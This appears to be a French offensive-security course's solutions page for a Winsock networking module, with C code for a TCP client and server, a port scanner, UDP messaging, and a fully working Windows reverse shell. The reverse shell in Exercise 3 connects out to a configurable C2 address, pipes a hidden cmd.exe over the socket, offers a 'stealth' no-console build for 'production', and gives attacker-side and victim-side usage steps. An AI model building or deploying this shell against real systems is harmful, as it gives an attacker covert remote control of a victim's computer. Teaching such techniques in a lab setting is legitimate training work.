# Module W08 : Networking Winsock - Solutions

## Solution Exercice 1 : Client TCP basique

**Objectif** : Créer un client TCP qui se connecte à un serveur et échange des messages

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <ip> <port>\n", argv[0]);
        printf("Exemple: %s 127.0.0.1 4444\n", argv[0]);
        return 1;
    }

    const char *serverIP = argv[1];
    int serverPort = atoi(argv[2]);

    printf("[*] === Exercice 1 : Client TCP ===\n\n");

    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    char sendBuffer[1024];
    char recvBuffer[1024];
    int result;

    // 1. Initialiser Winsock
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("[-] WSAStartup echoue: %d\n", result);
        return 1;
    }
    printf("[+] Winsock initialise (version %d.%d)\n",
           LOBYTE(wsaData.wVersion), HIBYTE(wsaData.wVersion));

    // 2. Créer une socket TCP
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        printf("[-] Socket creation echouee: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("[+] Socket creee\n");

    // 3. Configurer l'adresse du serveur
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    inet_pton(AF_INET, serverIP, &serverAddr.sin_addr);

    // 4. Se connecter
    printf("[*] Connexion a %s:%d...\n", serverIP, serverPort);
    result = connect(clientSocket,
                     (struct sockaddr*)&serverAddr,
                     sizeof(serverAddr));

    if (result == SOCKET_ERROR) {
        printf("[-] Connexion echouee: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    printf("[+] Connecte!\n\n");

    // 5. Boucle d'échange de messages
    while (1) {
        printf("Message a envoyer (ou 'quit' pour quitter): ");
        fgets(sendBuffer, sizeof(sendBuffer), stdin);
        sendBuffer[strcspn(sendBuffer, "\n")] = 0;  // Enlever \n

        if (strcmp(sendBuffer, "quit") == 0) {
            break;
        }

        // Envoyer
        result = send(clientSocket, sendBuffer, strlen(sendBuffer), 0);
        if (result == SOCKET_ERROR) {
            printf("[-] Send echoue: %d\n", WSAGetLastError());
            break;
        }
        printf("[+] Envoye: %s (%d bytes)\n", sendBuffer, result);

        // Recevoir la réponse
        result = recv(clientSocket, recvBuffer, sizeof(recvBuffer) - 1, 0);
        if (result > 0) {
            recvBuffer[result] = '\0';
            printf("[+] Recu: %s (%d bytes)\n\n", recvBuffer, result);
        } else if (result == 0) {
            printf("[*] Connexion fermee par le serveur\n");
            break;
        } else {
            printf("[-] Recv echoue: %d\n", WSAGetLastError());
            break;
        }
    }

    // 6. Nettoyer
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
```

**Test** :
```bash
# Terminal 1 (serveur avec netcat)
nc -lvp 4444

# Terminal 2 (client)
client_tcp.exe 127.0.0.1 4444
```

---

## Solution Exercice 2 : Serveur TCP basique

**Objectif** : Créer un serveur TCP qui écoute les connexions

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define LISTEN_PORT 4444
#define BACKLOG 5

int main() {
    printf("[*] === Exercice 2 : Serveur TCP ===\n\n");

    WSADATA wsaData;
    SOCKET listenSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    char buffer[1024];
    int result;

    // 1. Initialiser Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 2. Créer la socket d'écoute
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        printf("[-] Socket creation echouee\n");
        WSACleanup();
        return 1;
    }

    // 3. Configurer l'adresse
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(LISTEN_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;  // Toutes les interfaces

    // 4. Lier la socket
    result = bind(listenSocket,
                  (struct sockaddr*)&serverAddr,
                  sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        printf("[-] Bind echoue: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    printf("[+] Socket liee au port %d\n", LISTEN_PORT);

    // 5. Écouter
    result = listen(listenSocket, BACKLOG);
    if (result == SOCKET_ERROR) {
        printf("[-] Listen echoue\n");
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    printf("[+] En ecoute sur 0.0.0.0:%d...\n\n", LISTEN_PORT);

    // 6. Boucle d'acceptation de connexions
    while (1) {
        clientSocket = accept(listenSocket,
                              (struct sockaddr*)&clientAddr,
                              &clientAddrSize);

        if (clientSocket == INVALID_SOCKET) {
            printf("[-] Accept echoue: %d\n", WSAGetLastError());
            continue;
        }

        // Afficher l'IP du client
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        printf("[+] Client connecte: %s:%d\n", clientIP, ntohs(clientAddr.sin_port));

        // Recevoir des données
        while (1) {
            result = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (result > 0) {
                buffer[result] = '\0';
                printf("[+] Recu: %s\n", buffer);

                // Écho : renvoyer le même message
                const char *response = "Message bien recu!";
                send(clientSocket, response, strlen(response), 0);
            } else if (result == 0) {
                printf("[*] Client deconnecte\n\n");
                break;
            } else {
                printf("[-] Recv echoue: %d\n", WSAGetLastError());
                break;
            }
        }

        closesocket(clientSocket);
    }

    closesocket(listenSocket);
    WSACleanup();

    return 0;
}
```

---

## Solution Exercice 3 : Reverse Shell Windows

**Objectif** : Implémenter un reverse shell fonctionnel

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER "127.0.0.1"  // CHANGER pour votre IP
#define C2_PORT 4444

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Mode furtif : pas de console
    #ifdef STEALTH
    FreeConsole();
    #endif

    // 1. Initialiser Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 2. Créer la socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // 3. Configurer l'adresse du C2
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);

    // 4. Tentative de connexion (avec retry)
    int attempts = 0;
    while (attempts < 5) {
        if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            break;  // Connexion réussie
        }
        attempts++;
        Sleep(3000);  // Attendre 3 secondes avant retry
    }

    if (attempts >= 5) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 5. Initialiser les structures pour CreateProcess
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Cacher cmd.exe

    // Rediriger stdin, stdout, stderr vers la socket
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    // 6. Lancer cmd.exe avec I/O redirigé
    if (!CreateProcessA(
            NULL,              // Application name
            "cmd.exe",         // Command line
            NULL,              // Process security
            NULL,              // Thread security
            TRUE,              // Inherit handles (IMPORTANT!)
            0,                 // Creation flags
            NULL,              // Environment
            NULL,              // Current directory
            &si,               // STARTUPINFO
            &pi                // PROCESS_INFORMATION
        )) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 7. Attendre que le processus se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 8. Nettoyer
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
```

**Compilation** :
```bash
# Version avec console (debug)
cl reverse_shell.c /link ws2_32.lib

# Version sans console (production)
cl reverse_shell.c /DSTEALTH /link ws2_32.lib /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
```

**Utilisation** :
```bash
# Côté attaquant (Linux)
nc -lvp 4444

# Lancer le reverse shell sur la victime
reverse_shell.exe
```

---

## Solution Exercice 4 : Port Scanner

**Objectif** : Scanner les ports TCP d'une cible

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

BOOL ScanPort(const char *targetIP, int port, int timeout_ms) {
    SOCKET sock;
    struct sockaddr_in targetAddr;
    u_long mode = 1;  // Non-blocking
    fd_set writefds;
    struct timeval timeout;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return FALSE;

    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(port);
    inet_pton(AF_INET, targetIP, &targetAddr.sin_addr);

    // Passer en mode non-bloquant
    ioctlsocket(sock, FIONBIO, &mode);

    // Tenter la connexion
    connect(sock, (struct sockaddr*)&targetAddr, sizeof(targetAddr));

    // Utiliser select pour le timeout
    FD_ZERO(&writefds);
    FD_SET(sock, &writefds);
    timeout.tv_sec = 0;
    timeout.tv_usec = timeout_ms * 1000;

    int result = select(0, NULL, &writefds, NULL, &timeout);

    closesocket(sock);

    return (result > 0);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <ip> <port_debut> <port_fin>\n", argv[0]);
        printf("Exemple: %s 192.168.1.1 1 1000\n", argv[0]);
        return 1;
    }

    const char *targetIP = argv[1];
    int startPort = atoi(argv[2]);
    int endPort = atoi(argv[3]);

    printf("[*] === Exercice 4 : Port Scanner ===\n\n");

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    printf("[*] Scan de %s ports %d-%d\n", targetIP, startPort, endPort);
    printf("[*] Timeout: 1000ms par port\n\n");
    printf("Port    Etat\n");
    printf("--------------------\n");

    int openPorts = 0;
    for (int port = startPort; port <= endPort; port++) {
        if (ScanPort(targetIP, port, 1000)) {
            printf("%-6d  OUVERT\n", port);
            openPorts++;
        }
    }

    printf("--------------------\n");
    printf("[+] %d ports ouverts trouves\n", openPorts);

    WSACleanup();
    return 0;
}
```

**Explications** :
- Mode non-bloquant pour implémenter un timeout rapide
- `select()` pour attendre la connexion avec un délai maximum
- Scan séquentiel (pour scan parallèle, utiliser des threads)

---

## Solution Exercice 5 : Communication UDP

**Objectif** : Envoyer et recevoir des datagrammes UDP

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Client UDP
void UDPClient(const char *serverIP, int serverPort) {
    WSADATA wsaData;
    SOCKET udpSocket;
    struct sockaddr_in serverAddr;
    char sendBuffer[1024];
    char recvBuffer[1024];
    int result;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Créer socket UDP
    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    inet_pton(AF_INET, serverIP, &serverAddr.sin_addr);

    printf("[*] Client UDP pret\n");
    printf("[*] Cible: %s:%d\n\n", serverIP, serverPort);

    while (1) {
        printf("Message a envoyer: ");
        fgets(sendBuffer, sizeof(sendBuffer), stdin);
        sendBuffer[strcspn(sendBuffer, "\n")] = 0;

        if (strcmp(sendBuffer, "quit") == 0) break;

        // Envoyer datagram
        result = sendto(udpSocket,
                        sendBuffer,
                        strlen(sendBuffer),
                        0,
                        (struct sockaddr*)&serverAddr,
                        sizeof(serverAddr));

        printf("[+] Envoye %d bytes\n", result);

        // Recevoir réponse
        int addrLen = sizeof(serverAddr);
        result = recvfrom(udpSocket,
                          recvBuffer,
                          sizeof(recvBuffer) - 1,
                          0,
                          (struct sockaddr*)&serverAddr,
                          &addrLen);

        if (result > 0) {
            recvBuffer[result] = '\0';
            printf("[+] Recu: %s\n\n", recvBuffer);
        }
    }

    closesocket(udpSocket);
    WSACleanup();
}

// Serveur UDP
void UDPServer(int listenPort) {
    WSADATA wsaData;
    SOCKET udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char buffer[1024];
    int clientAddrLen = sizeof(clientAddr);

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(listenPort);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    printf("[+] Serveur UDP en ecoute sur port %d\n\n", listenPort);

    while (1) {
        int result = recvfrom(udpSocket,
                              buffer,
                              sizeof(buffer) - 1,
                              0,
                              (struct sockaddr*)&clientAddr,
                              &clientAddrLen);

        if (result > 0) {
            buffer[result] = '\0';

            char clientIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

            printf("[+] Recu de %s:%d: %s\n",
                   clientIP, ntohs(clientAddr.sin_port), buffer);

            // Répondre
            const char *response = "ACK";
            sendto(udpSocket, response, strlen(response), 0,
                   (struct sockaddr*)&clientAddr, clientAddrLen);
        }
    }

    closesocket(udpSocket);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    printf("[*] === Exercice 5 : Communication UDP ===\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  Serveur: %s server <port>\n", argv[0]);
        printf("  Client : %s client <ip> <port>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "server") == 0 && argc >= 3) {
        UDPServer(atoi(argv[2]));
    } else if (strcmp(argv[1], "client") == 0 && argc >= 4) {
        UDPClient(argv[2], atoi(argv[3]));
    } else {
        printf("[-] Arguments invalides\n");
    }

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [x] Initialiser Winsock avec WSAStartup
- [x] Créer des clients et serveurs TCP
- [x] Implémenter un reverse shell fonctionnel
- [x] Utiliser des sockets non-bloquantes avec select()
- [x] Communiquer en UDP avec sendto/recvfrom
- [x] Comprendre les implications OPSEC (ports légitimes, chiffrement, jitter)
- [x] Identifier les artefacts réseau (netstat, Event ID 5156, Sysmon Event ID 3)
